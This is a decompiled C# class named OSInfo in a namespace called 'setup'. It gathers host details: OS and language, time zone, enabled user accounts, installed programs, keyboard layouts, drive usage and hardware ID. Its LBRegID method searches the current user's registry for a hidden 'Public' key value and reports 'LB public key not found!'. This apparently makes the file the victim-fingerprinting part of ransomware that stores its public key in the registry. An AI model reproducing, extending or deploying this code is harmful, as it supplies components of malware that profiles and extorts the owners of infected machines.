using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace setup;

internal class OSInfo
{
	public static string GetOSLang()
	{
		return CultureInfo.InstalledUICulture.EnglishName;
	}

	public static string GetOSName()
	{
		return (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "ProductName", "UNKNOWN");
	}

	public static string GetTimeZone()
	{
		return "UTC" + TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).Hours.ToString("+#;-#; Standard Time");
	}

	public static string[] GetUsers()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			List<string> list = new List<string>();
			string machineName = Environment.MachineName;
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT Disabled,Caption FROM Win32_UserAccount").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					if (!(bool)current.get_Item("Disabled"))
					{
						string text = current.get_Item("Caption").ToString()!.Trim();
						if (text.StartsWith(machineName))
						{
							text = text.Substring(machineName.Length + 1);
						}
						if (text.Length > 0)
						{
							list.Add(text);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return list.ToArray();
		}
		catch (Exception exc)
		{
			return new string[1] { PrettyException(exc) };
		}
	}

	public static string[] GetInstalledSoft()
	{
		try
		{
			List<string> list = new List<string>();
			string[] array = new string[2] { "SOFTWARE", "SOFTWARE\\Wow6432Node" };
			foreach (string text in array)
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text + "\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name in subKeyNames)
				{
					using RegistryKey registryKey2 = registryKey.OpenSubKey(name);
					string text2 = Convert.ToString(registryKey2.GetValue("DisplayName"));
					if (text2.Length > 0)
					{
						list.Add(text2.ToString());
					}
				}
			}
			return list.ToArray();
		}
		catch (Exception exc)
		{
			return new string[1] { PrettyException(exc) };
		}
	}

	public static string[] GetKeyboards()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		try
		{
			List<string> list = new List<string>();
			foreach (InputLanguage item in (ReadOnlyCollectionBase)(object)InputLanguage.get_InstalledInputLanguages())
			{
				InputLanguage val = item;
				list.Add(val.get_LayoutName());
			}
			return list.ToArray();
		}
		catch (Exception exc)
		{
			return new string[1] { PrettyException(exc) };
		}
	}

	public static string[] GetDrivesInfo()
	{
		try
		{
			List<string> list = new List<string>();
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					string[] array = new string[2] { "1", "1" };
					try
					{
						array = new string[2]
						{
							driveInfo.TotalSize.ToString(),
							(driveInfo.TotalSize - driveInfo.AvailableFreeSpace).ToString()
						};
					}
					catch (Exception)
					{
					}
					string[] value = new string[4]
					{
						driveInfo.Name.TrimEnd(new char[1] { '\\' }),
						driveInfo.DriveType.ToString(),
						array[0],
						array[1]
					};
					list.Add(string.Join("||", value));
				}
				catch (Exception exc)
				{
					list.Add(PrettyException(exc));
				}
			}
			return list.ToArray();
		}
		catch (Exception exc2)
		{
			return new string[1] { PrettyException(exc2) };
		}
	}

	public static string GetHardwareID()
	{
		return Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig")!.GetValue("LastConfig")!.ToString()!.Trim('{', '}');
	}

	public static string LBRegID()
	{
		try
		{
			for (int i = 0; i < 10; i++)
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software"))
				{
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string text in subKeyNames)
					{
						if (text.ToUpper() == text && registryKey.OpenSubKey(text)!.GetValue("Public", new byte[0]) is byte[] array && array.Length >= 8)
						{
							string text2 = "";
							for (int k = 0; k <= 8; k++)
							{
								text2 += array[k].ToString("X2");
							}
							return text2;
						}
					}
				}
				Thread.Sleep(3000);
			}
			throw new Exception("LB public key not found!");
		}
		catch (Exception exc)
		{
			return PrettyException(exc);
		}
	}

	private static string PrettyException(Exception Exc)
	{
		return string.Format("[{0}] {1}", Exc.GetType().FullName, Exc.Message.Trim().Replace("\r\n", " "));
	}
}
